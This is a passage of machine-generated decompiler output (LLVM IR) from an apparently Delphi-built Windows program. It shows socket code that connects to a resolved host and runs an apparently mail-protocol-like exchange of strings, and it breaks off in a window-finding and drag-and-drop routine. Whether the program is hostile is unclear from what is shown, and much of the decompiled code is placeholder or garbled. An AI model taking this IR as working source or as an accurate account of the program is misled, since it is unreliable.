  store i32 %105, i32* %107, align 4, !insn.addr !1171
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !1172
  %109 = load i32, i32* %17, align 4, !insn.addr !1173
  %110 = add i32 %esp.0.reload, -12, !insn.addr !1173
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !1173
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !1174
  %113 = load i32, i32* %19, align 4, !insn.addr !1175
  %114 = add i32 %esp.0.reload, -16, !insn.addr !1175
  %115 = inttoptr i32 %114 to i32*, !insn.addr !1175
  store i32 %113, i32* %115, align 4, !insn.addr !1175
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !1176
  %117 = load i32, i32* %21, align 4, !insn.addr !1177
  %118 = add i32 %esp.0.reload, -20, !insn.addr !1177
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !1177
  %120 = call i32 @"@LStrCatN"(), !insn.addr !1178
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !1179
  %122 = load i32, i32* %23, align 4, !insn.addr !1180
  %123 = add i32 %122, -1, !insn.addr !1180
  %124 = icmp eq i32 %123, 0, !insn.addr !1180
  store i32 %123, i32* %23, align 4, !insn.addr !1180
  %125 = icmp eq i1 %124, false, !insn.addr !1181
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !1181
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !1181
  br i1 %125, label %dec_label_pc_40596a, label %dec_label_pc_405b09, !insn.addr !1181

dec_label_pc_405b09:                              ; preds = %dec_label_pc_405ab5
  %126 = load i32, i32* %119, align 4, !insn.addr !1182
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !1183
  store i32 4217643, i32* %111, align 4, !insn.addr !1184
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !1185
  ret i32 %127, !insn.addr !1186
}

define i32 @function_405b24() local_unnamed_addr {
dec_label_pc_405b24:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1187
  ret i32 %0, !insn.addr !1187
}

define i32 @function_405b29() local_unnamed_addr {
dec_label_pc_405b29:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1188
}

define i32 @function_405b2b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405b2b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1189
}

define i32 @function_405b34() local_unnamed_addr {
dec_label_pc_405b34:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !1190
  %0 = call i32 @function_4036c8(), !insn.addr !1191
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1192
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !1193
  %3 = call i32 @"@FillChar"(), !insn.addr !1194
  %4 = icmp eq %hostent* %2, null, !insn.addr !1195
  br i1 %4, label %dec_label_pc_405b7f, label %dec_label_pc_405b5d, !insn.addr !1196

dec_label_pc_405b5d:                              ; preds = %dec_label_pc_405b34
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !1193
  %6 = add i32 %5, 12, !insn.addr !1197
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1197
  %8 = load i32, i32* %7, align 4, !insn.addr !1197
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1198
  %10 = load i32, i32* %9, align 4, !insn.addr !1198
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1199
  %12 = load i8, i8* %11, align 1, !insn.addr !1199
  %13 = sext i8 %12 to i32, !insn.addr !1200
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !1201
  br label %dec_label_pc_405b7f, !insn.addr !1201

dec_label_pc_405b7f:                              ; preds = %dec_label_pc_405b5d, %dec_label_pc_405b34
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !1202
}

define i32 @function_405b90() local_unnamed_addr {
dec_label_pc_405b90:
  %esp.0.reg2mem = alloca i32, !insn.addr !1203
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1204
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1205
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !1205
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !1205
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1206
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !1207
  %5 = trunc i32 %4 to i16, !insn.addr !1207
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1208
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1209
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1209
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1210
  %9 = icmp eq i32 %8, -1, !insn.addr !1211
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1212
  br i1 %9, label %dec_label_pc_405c1e, label %dec_label_pc_405bdf, !insn.addr !1212

dec_label_pc_405bdf:                              ; preds = %dec_label_pc_405b90
  %10 = call i32 @function_405b34(), !insn.addr !1213
  %11 = trunc i32 %10 to i16, !insn.addr !1214
  %12 = call i16 @htons(i16 %11), !insn.addr !1214
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1215
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1215
  %14 = sext i16 %12 to i32, !insn.addr !1216
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1216
  %16 = icmp eq i32 %15, 0, !insn.addr !1217
  %17 = icmp eq i1 %16, false, !insn.addr !1218
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1218
  br i1 %17, label %dec_label_pc_405c1e, label %dec_label_pc_405c16, !insn.addr !1218

dec_label_pc_405c16:                              ; preds = %dec_label_pc_405bdf
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1219
  store i32 %8, i32* %18, align 4, !insn.addr !1219
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1220
  br label %dec_label_pc_405c1e, !insn.addr !1220

dec_label_pc_405c1e:                              ; preds = %dec_label_pc_405c16, %dec_label_pc_405bdf, %dec_label_pc_405b90
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1221
  %20 = load i32, i32* %19, align 4, !insn.addr !1221
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1222
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1223
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1223
  store i32 4217915, i32* %22, align 4, !insn.addr !1223
  %23 = call i32 @"@LStrClr"(), !insn.addr !1224
  ret i32 %23, !insn.addr !1225
}

define i32 @function_405c34() local_unnamed_addr {
dec_label_pc_405c34:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1226
  ret i32 %0, !insn.addr !1226
}

define i32 @function_405c39() local_unnamed_addr {
dec_label_pc_405c39:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1227
}

define i32 @function_405c3b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c3b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1228
}

define i32 @function_405c44() local_unnamed_addr {
dec_label_pc_405c44:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1229
  %2 = call i32 @WSACleanup(), !insn.addr !1230
  ret i32 %2, !insn.addr !1231
}

define i32 @function_405c50() local_unnamed_addr {
dec_label_pc_405c50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1232
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1233
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1233
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1233
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1234
  %4 = call i32 @function_4036c8(), !insn.addr !1235
  %5 = call i32 @StrCopy(), !insn.addr !1236
  %6 = call i32 @function_4074f8(i32 4), !insn.addr !1237
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1238
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1239
  %9 = call i32 @"@LStrClr"(), !insn.addr !1240
  ret i32 %9, !insn.addr !1241
}

define i32 @function_405cc1() local_unnamed_addr {
dec_label_pc_405cc1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1242
  ret i32 %0, !insn.addr !1242
}

define i32 @function_405cc6() local_unnamed_addr {
dec_label_pc_405cc6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1243
}

define i32 @function_405cc8(i32 %arg1) local_unnamed_addr {
dec_label_pc_405cc8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1244
}

define i32 @function_405cd0() local_unnamed_addr {
dec_label_pc_405cd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1245
  %2 = call i32 @StrPas(), !insn.addr !1246
  ret i32 %2, !insn.addr !1247
}

define i32 @function_405cfc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405cfc:
  %esp.1.reg2mem = alloca i32, !insn.addr !1248
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1248
  %esp.0.reg2mem = alloca i32, !insn.addr !1248
  %ecx.0.reg2mem = alloca i32, !insn.addr !1248
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1249
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1250
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1250
  br label %dec_label_pc_405d05, !insn.addr !1250

dec_label_pc_405d05:                              ; preds = %dec_label_pc_405d05, %dec_label_pc_405cfc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1251
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1251
  store i32 0, i32* %2, align 4, !insn.addr !1251
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1252
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1252
  store i32 0, i32* %4, align 4, !insn.addr !1252
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1253
  %6 = icmp eq i32 %5, 0, !insn.addr !1253
  %7 = icmp eq i1 %6, false, !insn.addr !1254
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1254
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1254
  br i1 %7, label %dec_label_pc_405d05, label %dec_label_pc_405d0c, !insn.addr !1254

dec_label_pc_405d0c:                              ; preds = %dec_label_pc_405d05
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1255
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1255
  store i32 0, i32* %9, align 4, !insn.addr !1255
  %10 = call i32 @function_4036b8(), !insn.addr !1256
  %11 = call i32 @function_4036b8(), !insn.addr !1257
  %12 = call i32 @function_4036b8(), !insn.addr !1258
  %13 = call i32 @function_4036b8(), !insn.addr !1259
  %14 = call i32 @function_4036b8(), !insn.addr !1260
  %15 = call i32 @function_4036b8(), !insn.addr !1261
  %16 = call i32 @function_4036b8(), !insn.addr !1262
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1263
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1263
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1263
  store i32 %19, i32* %18, align 4, !insn.addr !1263
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1264
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1264
  store i32 4218737, i32* %21, align 4, !insn.addr !1264
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1265
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1265
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1265
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1266
  %25 = call i32 @function_405b90(), !insn.addr !1267
  %26 = icmp eq i32 %25, 0, !insn.addr !1268
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1269
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1269
  br i1 %26, label %dec_label_pc_405f3c, label %dec_label_pc_405d7a, !insn.addr !1269

dec_label_pc_405d7a:                              ; preds = %dec_label_pc_405d0c
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1270
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1270
  store i32 ptrtoint ([6 x i8]* @global_var_405f8c to i32), i32* %28, align 4, !insn.addr !1270
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1271
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1271
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1272
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1272
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %32, align 4, !insn.addr !1272
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1273
  %34 = call i32 @function_405c50(), !insn.addr !1274
  %35 = call i32 @function_405cd0(), !insn.addr !1275
  %36 = call i32 @function_405c50(), !insn.addr !1276
  %37 = call i32 @function_405cd0(), !insn.addr !1277
  %38 = call i32 @"@LStrCat"(), !insn.addr !1278
  %39 = call i32 @function_405c50(), !insn.addr !1279
  %40 = call i32 @function_405cd0(), !insn.addr !1280
  %41 = call i32 @"@LStrCat"(), !insn.addr !1281
  %42 = call i32 @function_405c50(), !insn.addr !1282
  %43 = call i32 @function_405cd0(), !insn.addr !1283
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1284
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1284
  store i32 ptrtoint ([13 x i8]* @global_var_405fc0 to i32), i32* %45, align 4, !insn.addr !1284
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1285
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1285
  store i32 %arg1, i32* %47, align 4, !insn.addr !1285
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1286
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1286
  store i32 ptrtoint (i32* @global_var_405fd8 to i32), i32* %49, align 4, !insn.addr !1286
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1287
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1287
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %51, align 4, !insn.addr !1287
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1288
  %53 = call i32 @function_405c50(), !insn.addr !1289
  %54 = call i32 @function_405cd0(), !insn.addr !1290
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1291
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1291
  store i32 ptrtoint ([11 x i8]* @global_var_405fe4 to i32), i32* %56, align 4, !insn.addr !1291
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1292
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1292
  store i32 %arg2, i32* %58, align 4, !insn.addr !1292
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1293
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1293
  store i32 ptrtoint (i32* @global_var_405fd8 to i32), i32* %60, align 4, !insn.addr !1293
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1294
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1294
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %62, align 4, !insn.addr !1294
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1295
  %64 = call i32 @function_405c50(), !insn.addr !1296
  %65 = call i32 @function_405cd0(), !insn.addr !1297
  %66 = call i32 @function_405c50(), !insn.addr !1298
  %67 = call i32 @function_405cd0(), !insn.addr !1299
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1300
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1300
  store i32 ptrtoint ([8 x i8]* @global_var_406008 to i32), i32* %69, align 4, !insn.addr !1300
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1301
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1301
  store i32 %arg1, i32* %71, align 4, !insn.addr !1301
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1302
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1302
  store i32 ptrtoint (i32* @global_var_405fd8 to i32), i32* %73, align 4, !insn.addr !1302
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1303
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1303
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %75, align 4, !insn.addr !1303
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1304
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1304
  store i32 ptrtoint ([6 x i8]* @global_var_406018 to i32), i32* %77, align 4, !insn.addr !1304
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1305
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1305
  store i32 %arg2, i32* %79, align 4, !insn.addr !1305
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1306
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1306
  store i32 ptrtoint (i32* @global_var_405fd8 to i32), i32* %81, align 4, !insn.addr !1306
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1307
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1307
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %83, align 4, !insn.addr !1307
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1308
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1308
  store i32 ptrtoint ([10 x i8]* @global_var_406028 to i32), i32* %85, align 4, !insn.addr !1308
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1309
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1309
  store i32 %arg3, i32* %87, align 4, !insn.addr !1309
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1310
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1310
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %89, align 4, !insn.addr !1310
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1311
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1311
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %91, align 4, !insn.addr !1311
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1312
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1312
  store i32 %arg4, i32* %93, align 4, !insn.addr !1312
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1313
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1313
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %95, align 4, !insn.addr !1313
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1314
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1314
  store i32 ptrtoint (i32* @global_var_40603c to i32), i32* %97, align 4, !insn.addr !1314
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1315
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405f9c to i32), i32* %99, align 4, !insn.addr !1315
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1316
  %101 = call i32 @function_405c50(), !insn.addr !1317
  %102 = call i32 @function_405cd0(), !insn.addr !1318
  %103 = call i32 @function_405c50(), !insn.addr !1319
  %104 = call i32 @function_405cd0(), !insn.addr !1320
  %105 = call i32 @function_405c44(), !insn.addr !1321
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1322
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1322
  br label %dec_label_pc_405f3c, !insn.addr !1322

dec_label_pc_405f3c:                              ; preds = %dec_label_pc_405d7a, %dec_label_pc_405d0c
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1323
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1323
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1324
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1325
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1326
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1326
  store i32 4218744, i32* %110, align 4, !insn.addr !1326
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1327
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1328
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1329
  ret i32 %113, !insn.addr !1330
}

define i32 @function_405f71() local_unnamed_addr {
dec_label_pc_405f71:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1331
  ret i32 %0, !insn.addr !1331
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1332
}

define i32 @function_405f78(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1333
}

define i32 @function_406043() local_unnamed_addr {
dec_label_pc_406043:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1334
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1334
  store i32 %3, i32* %4, align 4, !insn.addr !1334
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1335
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1335
  %9 = add i8 %6, %8, !insn.addr !1335
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1335
  store i8 %9, i8* %10, align 1, !insn.addr !1335
  %11 = add i32 %2, 85, !insn.addr !1336
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1336
  %13 = load i8, i8* %12, align 1, !insn.addr !1336
  %14 = trunc i32 %1 to i8, !insn.addr !1336
  %15 = add i8 %13, %14, !insn.addr !1336
  store i8 %15, i8* %12, align 1, !insn.addr !1336
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1337
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1337
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1337
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1338
  %18 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1339
  %19 = add i32 %18, 1, !insn.addr !1339
  %20 = icmp eq i32 %19, 0, !insn.addr !1339
  store i32 %19, i32* @global_var_4096c0, align 4, !insn.addr !1339
  %21 = icmp eq i1 %20, false, !insn.addr !1340
  br i1 %21, label %dec_label_pc_40607d, label %dec_label_pc_406069, !insn.addr !1340

dec_label_pc_406069:                              ; preds = %dec_label_pc_406043
  %22 = call i32 @"@LStrClr"(), !insn.addr !1341
  %23 = call i32 @"@LStrClr"(), !insn.addr !1342
  br label %dec_label_pc_40607d, !insn.addr !1342

dec_label_pc_40607d:                              ; preds = %dec_label_pc_406069, %dec_label_pc_406043
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1343
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1344
  ret i32 0, !insn.addr !1345
}

define i32 @function_40608b() local_unnamed_addr {
dec_label_pc_40608b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1346
  ret i32 %0, !insn.addr !1346
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1347
}

define i32 @function_406092(i32 %arg1) local_unnamed_addr {
dec_label_pc_406092:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1348
}

define i32 @function_406094() local_unnamed_addr {
dec_label_pc_406094:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1349
  %2 = add i32 %1, -1, !insn.addr !1349
  store i32 %2, i32* @global_var_4096c0, align 4, !insn.addr !1349
  ret i32 %0, !insn.addr !1350
}

define i32 @function_40609c() local_unnamed_addr {
dec_label_pc_40609c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1351
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1352
  %2 = icmp eq i32 %0, 0, !insn.addr !1353
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1354
  br i1 %2, label %dec_label_pc_4061a6, label %dec_label_pc_4060b6, !insn.addr !1354

dec_label_pc_4060b6:                              ; preds = %dec_label_pc_40609c
  %3 = call i32 @function_4036c8(), !insn.addr !1355
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1356
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1356
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1356
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1357
  %7 = icmp eq i1 %6, false, !insn.addr !1358
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1359
  br i1 %7, label %dec_label_pc_4061a6, label %dec_label_pc_4060d1, !insn.addr !1359

dec_label_pc_4060d1:                              ; preds = %dec_label_pc_4060b6
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_4061b4 to i32*), i8* null, i8* %8), !insn.addr !1360
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1360
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1361
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1361
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1362
  %13 = icmp eq i1 %12, false, !insn.addr !1363
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1364
  br i1 %13, label %dec_label_pc_4061a6, label %dec_label_pc_4060fa, !insn.addr !1364

dec_label_pc_4060fa:                              ; preds = %dec_label_pc_4060d1
  %14 = call i32 @function_4034c8(), !insn.addr !1365
  %15 = add i32 %14, 22, !insn.addr !1366
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1367
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1367
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1368
  %18 = icmp eq i32* %17, null, !insn.addr !1369
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1370
  br i1 %18, label %dec_label_pc_4061a6, label %dec_label_pc_406119, !insn.addr !1370

dec_label_pc_406119:                              ; preds = %dec_label_pc_4060fa
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1371
  %20 = icmp eq i32* %19, null, !insn.addr !1372
  %21 = icmp eq i1 %20, false, !insn.addr !1373
  br i1 %21, label %dec_label_pc_40612d, label %dec_label_pc_406125, !insn.addr !1373

dec_label_pc_406125:                              ; preds = %dec_label_pc_406119
  %22 = bitcast i32* %17 to i8*, !insn.addr !1374
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1374
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1374
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1375
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1376
  br label %dec_label_pc_4061a6, !insn.addr !1376

dec_label_pc_40612d:                              ; preds = %dec_label_pc_406119
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1368
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1371
  store i32 20, i32* %19, align 4, !insn.addr !1377
  %27 = add i32 %26, 4, !insn.addr !1378
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1378
  store i32 0, i32* %28, align 4, !insn.addr !1378
  %29 = add i32 %26, 8, !insn.addr !1379
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1379
  store i32 0, i32* %30, align 4, !insn.addr !1379
  %31 = add i32 %26, 12, !insn.addr !1380
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1380
  store i32 0, i32* %32, align 4, !insn.addr !1380
  %33 = add i32 %26, 16, !insn.addr !1381
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1381
  store i32 0, i32* %34, align 4, !insn.addr !1381
  %35 = call i32 @function_4036c8(), !insn.addr !1382
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1383
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1383
